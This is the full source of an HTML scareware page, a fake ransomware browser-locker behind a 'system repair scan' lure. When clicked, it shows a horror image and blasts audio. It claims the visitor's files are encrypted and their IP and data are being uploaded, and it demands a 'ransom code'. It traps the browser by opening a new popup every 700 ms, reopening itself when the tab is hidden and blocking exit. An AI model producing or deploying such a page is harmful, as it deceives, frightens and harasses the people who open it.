<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ CRITICAL_SYSTEM_ERROR ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
        
        /* ميزة الصورة المتحركة سواسوة */
        #horrorImg { 
            position: absolute; 
            width: 120vw; height: 120vh; /* أكبر من الشاشة باش كي تتحرك ما يبانش الفراغ */
            object-fit: cover; 
            z-index: 9999; display: none; 
            filter: contrast(200%) brightness(70%) grayscale(50%);
            transition: all 0.1s ease-in-out; /* حركة سريعة ومفاجئة */
        }

        #deepWebOverlay { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
            background: rgba(0,0,0,0.85); padding: 30px; border: 2px solid #600; display: none; width: 90%; 
            box-shadow: 0 0 100px #f00;
        }

        .eyes-pulse { animation: pulse 0.5s infinite alternate; }
        @keyframes pulse { from { filter: hue-rotate(0deg) contrast(200%); } to { filter: hue-rotate(20deg) contrast(250%); } }

        .blink-red { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        
        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 12px; width: 80%; text-align: center; font-weight: bold; }
    </style>
</head>
<body onclick="launchNightmare()">

    <div id="setup" style="color: #600; font-family: monospace; font-size: 14px; text-align: center; cursor: pointer;">
        [ SYSTEM_REPAIR_REQUIRED ]<br>
        PLEASE CLICK TO INITIALIZE SCAN...
    </div>

    <img id="horrorImg" class="eyes-pulse" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <div id="deepWebOverlay">
        <h1 class="blink-red" style="font-size: 26px; letter-spacing: 5px;">I SEE YOU</h1>
        <p style="font-size: 14px; color: #fff; font-weight: bold;">
            لقد انتهى وقتك. جميع ملفاتك مشفرة ولن تسمع إلا هذا الصوت.
        </p>
        <p style="font-size: 11px; color: #ff0000;">IP: <span id="ip">TRACKED</span> | DATA: <span class="blink-red">UPLOADING...</span></p>
        
        <input type="text" id="unlockBox" placeholder="أدخل كود الفدية للمغادرة" oninput="verifyAdmin()">
        <p style="font-size: 10px; color: #555; margin-top: 10px;">ROOT@DEEPWEB_TERMINAL</p>
    </div>

    <audio id="sfx" loop>
        <source src="tfy-krk.mp3" type="audio/mpeg">
    </audio>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.get('user') === 'admin_dz'; 
        const MY_LINK = window.location.href;
        const audio = document.getElementById('sfx');
        const img = document.getElementById('horrorImg');

        function launchNightmare() {
            if (isAdmin) return alert("Admin Bypass: Active.");
            
            fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
            localStorage.setItem('terminal_breach', 'true');

            document.getElementById('setup').style.display = 'none';
            img.style.display = 'block';
            document.getElementById('deepWebOverlay').style.display = 'block';
            
            // تشغيل الصوت كامل وبقوة سواسوة
            audio.volume = 1.0;
            audio.currentTime = 0;
            audio.play();

            // ميزة تحريك الصورة عشوائياً (Dynamic Stalking) سواسوة
            setInterval(() => {
                if (!isAdmin) {
                    const x = Math.random() * 20 - 10; // تحرك بين -10 و 10
                    const y = Math.random() * 20 - 10;
                    img.style.transform = `translate(${x}px, ${y}px) scale(1.1)`;
                }
            }, 100);

            // الحبس الأبدي سواسوة
            setInterval(() => {
                if (!isAdmin) window.open(MY_LINK, '_blank', 'width=1,height=1');
            }, 700);
        }

        function verifyAdmin() {
            if (document.getElementById('unlockBox').value === "free palastine") {
                localStorage.removeItem('terminal_breach');
                location.href = "https://www.google.com";
            }
        }

        window.onbeforeunload = () => "FILES_ENCRYPTED_PERMANENTLY";
        document.addEventListener("visibilitychange", () => {
            if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
        });
    </script>
</body>
</html>
